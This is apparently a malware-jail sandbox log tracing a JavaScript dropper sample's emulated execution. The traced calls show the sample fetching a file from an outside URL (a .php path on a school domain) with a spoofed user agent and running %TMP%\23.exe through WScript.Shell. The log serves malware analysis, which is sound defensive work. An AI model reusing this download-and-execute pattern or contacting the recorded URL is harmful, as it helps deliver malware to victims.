14 Oct 00:03:18 - mailware-jail, a malware sandbox ver. 0.8
14 Oct 00:03:18 - ------------------------
14 Oct 00:03:18 - Sandbox environment sequence: env/utils.js,env/eval.js,env/function.js,env/wscript.js,env/browser.js,env/agents.js,env/other.js,env/console.js
14 Oct 00:03:18 - Malware files: malware/20161013/_TMP__XipXkrLd.js
14 Oct 00:03:18 - Output file for sandbox dump: sandbox_dump_after.json
14 Oct 00:03:18 - Output directory for generated files: output/
14 Oct 00:03:18 - ==> Preparing Sandbox environment.
14 Oct 00:03:18 -  => Executing: env/utils.js
14 Oct 00:03:18 -  => Executing: env/eval.js
14 Oct 00:03:18 - Preparing sandbox to intercept eval() calls.
14 Oct 00:03:18 -  => Executing: env/function.js
14 Oct 00:03:18 - Preparing sandbox to intercept 'new Function()' calls.
14 Oct 00:03:18 -  => Executing: env/wscript.js
14 Oct 00:03:18 - Preparing sandbox to emulate WScript environment.
14 Oct 00:03:18 -  => Executing: env/browser.js
14 Oct 00:03:18 - Preparing sandbox to emulate Browser environment (default = IE11).
14 Oct 00:03:18 - Created: window[1]
14 Oct 00:03:18 - Created: document[2]
14 Oct 00:03:18 - document[2].createElement(html)
14 Oct 00:03:18 - Element[3] created, named: 'html'
14 Oct 00:03:18 - document[2].createElement(body)
14 Oct 00:03:18 - Element[5] created, named: 'body'
14 Oct 00:03:18 - document[2].body = 'Element[5]'
14 Oct 00:03:18 - document[2].createElement(head)
14 Oct 00:03:18 - Element[7] created, named: 'head'
14 Oct 00:03:18 - Element[3].appendChild(Element[7])
14 Oct 00:03:18 - Element[3].firstChild set
14 Oct 00:03:18 - document[2].body.get() => Element[5]
14 Oct 00:03:18 - Element[3].appendChild(Element[5])
14 Oct 00:03:18 -  => Executing: env/agents.js
14 Oct 00:03:18 - Setting Browser environment to: IE8 on Win10 64bit
14 Oct 00:03:18 - window[1].userAgent.get() => Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 10.0; WOW64; Trident/7.0; Touch; .NET4.0C; .NET4.0E; . ... (truncated)
14 Oct 00:03:18 -  => Executing: env/other.js
14 Oct 00:03:18 -  => Executing: env/console.js
14 Oct 00:03:18 - ==> Executing malware file(s).
14 Oct 00:03:18 -  => Executing: malware/20161013/_TMP__XipXkrLd.js
14 Oct 00:03:18 - WScript.Sleep(500)
14 Oct 00:03:18 - WScript.Sleep(500)
14 Oct 00:03:19 - WScript.Sleep(500)
14 Oct 00:03:19 - WScript.Sleep(500)
14 Oct 00:03:20 - WScript.Sleep(500)
14 Oct 00:03:20 - WScript.Sleep(500)
14 Oct 00:03:21 - WScript.Sleep(500)
14 Oct 00:03:21 - WScript.Sleep(500)
14 Oct 00:03:22 - WScript.Sleep(500)
14 Oct 00:03:22 - WScript.Sleep(500)
14 Oct 00:03:23 - WScript.Sleep(500)
14 Oct 00:03:23 - WScript.Sleep(500)
14 Oct 00:03:24 - ActiveXObject(WScript.Shell)
14 Oct 00:03:24 - Created: WScript.Shell[9]
14 Oct 00:03:24 - WScript.Shell[9].ExpandEnvironmentStrings(%TMP%)
14 Oct 00:03:24 - ActiveXObject(MSXML2.XMLHTTP)
14 Oct 00:03:24 - Created: MSXML2.XMLHTTP[10]
14 Oct 00:03:24 - MSXML2.XMLHTTP[10].open(GET,http://lcbschool2.ac.th/pic/_notes/logs.php,false)
14 Oct 00:03:24 - MSXML2.XMLHTTP[10].async = (boolean) 'false'
14 Oct 00:03:24 - MSXML2.XMLHTTP[10].async.get() => (boolean) 'false'
14 Oct 00:03:24 - MSXML2.XMLHTTP[10].setRequestHeader(User-Agent, Python-urllib/3.1)
14 Oct 00:03:24 - MSXML2.XMLHTTP[10].send(undefined)
14 Oct 00:03:41 - MSXML2.XMLHTTP[10].onreadystatechange(), readyState = 4 length: 16 status: 404
14 Oct 00:03:41 - MSXML2.XMLHTTP[10] statusText = null
14 Oct 00:03:41 - MSXML2.XMLHTTP[10].responseBody = (object) 'File not found.?'
14 Oct 00:03:41 - MSXML2.XMLHTTP[10].status = (number) '404'
14 Oct 00:03:41 - MSXML2.XMLHTTP[10].onreadystatechange() undefined
14 Oct 00:03:41 - MSXML2.XMLHTTP[10].send(undefined) finished
14 Oct 00:03:41 - MSXML2.XMLHTTP[10].status.get() => (number) '404'
14 Oct 00:03:41 - WScript.Shell[9].Run(%TMP%\23.exe, 1, 0)
14 Oct 00:03:41 - Exception occured: object ReferenceError: MBGwN is not defined
    at OsLAgfHCfdr (malware/20161013/_TMP__XipXkrLd.js:56:9)
    at malware/20161013/_TMP__XipXkrLd.js:21:1
    at ContextifyScript.Script.runInContext (vm.js:35:29)
    at Object.exports.runInContext (vm.js:67:17)
    at run_in_ctx (/media/usb2/home/hynek/jscript/malware-jail/jailme.js:145:16)
    at Object.<anonymous> (/media/usb2/home/hynek/jscript/malware-jail/jailme.js:168:1)
    at Module._compile (module.js:556:32)
    at Object.Module._extensions..js (module.js:565:10)
    at Module.load (module.js:473:32)
    at tryModuleLoad (module.js:432:12)
14 Oct 00:03:41 - ==> Cleaning up sandbox.
14 Oct 00:03:41 - ==> Script execution finished, dumping sandbox environment to a file.
14 Oct 00:03:41 - MSXML2.XMLHTTP[10].ResponseBody.get() => (object) 'File not found.?'
14 Oct 00:03:41 - The sandbox context has been  saved to: sandbox_dump_after.json
